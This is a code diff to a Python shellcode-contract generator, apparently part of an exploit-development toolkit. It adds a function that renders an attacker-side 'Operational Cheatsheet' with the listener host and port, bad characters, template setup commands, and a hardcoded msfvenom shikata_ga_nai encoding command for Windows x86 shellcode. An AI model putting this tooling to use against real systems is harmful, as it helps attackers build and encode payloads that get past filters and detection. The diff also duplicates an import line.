@@ -5,8 +5,11 @@ return strings.
 """
 from __future__ import annotations
 
+from __future__ import annotations
+
 from .api_database import API_DATABASE, STRUCT_DATABASE, MODULE_LOAD_ORDER
 from .hash_gen import ror13
+from .payload_templates.base import PayloadTemplate, TemplateConfig
 from .schema import Manifest
 from .stack_alloc import StackLayout
 
@@ -263,11 +266,74 @@ def emit_struct_layouts_md(manifest: Manifest, layout: StackLayout) -> str:
     return result
 
 
-def emit_full_contract_md(manifest: Manifest, layout: StackLayout) -> str:
-    """Concatenate all three sections into one Markdown document."""
+def emit_cheatsheet_md(
+    template: PayloadTemplate | None,
+    config: TemplateConfig | None,
+    shellcode_size: int | None = None,
+    bad_chars: set[int] | None = None,
+) -> str:
+    """Render attacker-side operational commands as a Markdown section.
+
+    Returns empty string when no template is provided.
+    """
+    if template is None or config is None:
+        return ""
+
+    lines: list[str] = ["# Operational Cheatsheet", ""]
+
+    # Summary block
+    lines.append(f"**Template:** {type(template).__name__}")
+    lines.append(f"**Target:** `{config.lhost}:{config.lport}`")
+    if shellcode_size is not None:
+        lines.append(f"**Shellcode size:** {shellcode_size} bytes")
+    if bad_chars:
+        sorted_chars = sorted(bad_chars)
+        char_str = " ".join(f"`0x{b:02x}`" for b in sorted_chars)
+        lines.append(f"**Bad characters:** {char_str}")
+    lines.append("")
+
+    # Template-specific commands
+    entries = template.cheatsheet(config)
+    if entries:
+        lines.append("## Setup Commands")
+        lines.append("")
+        for desc, cmd in entries:
+            lines.append(f"**{desc}:**")
+            lines.append(f"```")
+            lines.append(cmd)
+            lines.append(f"```")
+            lines.append("")
+
+    # Common post-exploitation helpers
+    lines.append("## Encoding (if needed)")
+    lines.append("")
+    lines.append("Remove bad chars with msfvenom (requires `shellcode.bin`):")
+    bc_flag = "".join(f"\\x{b:02x}" for b in sorted(bad_chars or {0x00}))
+    lines.append("```")
+    lines.append(
+        f'cat shellcode.bin | msfvenom --platform windows -a x86 '
+        f'-e x86/shikata_ga_nai -b "{bc_flag}" -f python -v shellcode'
+    )
+    lines.append("```")
+
+    result = "\n".join(line.rstrip() for line in lines)
+    return result
+
+
+def emit_full_contract_md(
+    manifest: Manifest,
+    layout: StackLayout,
+    template: PayloadTemplate | None = None,
+    config: TemplateConfig | None = None,
+    shellcode_size: int | None = None,
+) -> str:
+    """Concatenate all sections into one Markdown document."""
     stack_section = emit_stack_layout_md(manifest, layout)
     api_section = emit_api_contracts_md(manifest, layout)
     struct_section = emit_struct_layouts_md(manifest, layout)
+    cheatsheet_section = emit_cheatsheet_md(
+        template, config, shellcode_size, manifest.badchars
+    )
 
     parts = [
         "# Shellcode Contract",
@@ -286,6 +352,14 @@ def emit_full_contract_md(manifest: Manifest, layout: StackLayout) -> str:
         "",
         struct_section,
     ]
+
+    if cheatsheet_section:
+        parts += [
+            "",
+            "---",
+            "",
+            cheatsheet_section,
+        ]
 
     result = "\n".join(line.rstrip() for line in parts)
     return result
